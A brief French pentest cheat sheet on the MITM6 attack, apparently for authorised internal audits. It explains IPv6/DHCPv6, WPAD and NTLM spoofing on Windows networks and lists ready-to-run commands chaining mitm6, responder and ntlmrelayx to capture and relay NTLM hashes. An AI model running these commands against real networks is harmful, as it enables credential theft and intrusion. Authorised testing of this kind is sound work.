# MITM6

Toujours rester devant et être prêt à le couper rapidement au cas où, à cause des gros impacts potentiels chez le client.

## Principe 

- IPv6 est souvent activé par défaut sur Windows même si très peu utilisé.
- Ces flux IPv6 sont souvent moins surveillés et bloqués que pour IPv4.
- MITM6 exploite plusieurs mécanismes d'IPv6 et se fait passer pour un faux serveur.
- Cela inclut entre autres le DHCPv6, le NDP, le WPAD, le DNS ou le NTLM.

## Installation et préparation

	sudo apt install mitm6
	
	mkdir /audit/ntlmrelay_lootdir
	
	netexec smb <PLAGE> --gen-relay-list /audit/relay-targets.txt

	sudo sed -i 's/127.0.0.1 9050/127.0.0.1 1080/' /etc/proxychains4.conf
  
## Exécution

	ntlmrelayx.py -l /audit/ntlmrelay_lootdir -of /audit/ntlmrelay_lootdir/ntlm_hashes -tf /audit/relay-targets.txt -smb2support -socks -w

	sudo mitm6 -i eth1 -v

	sudo responder -I eth1
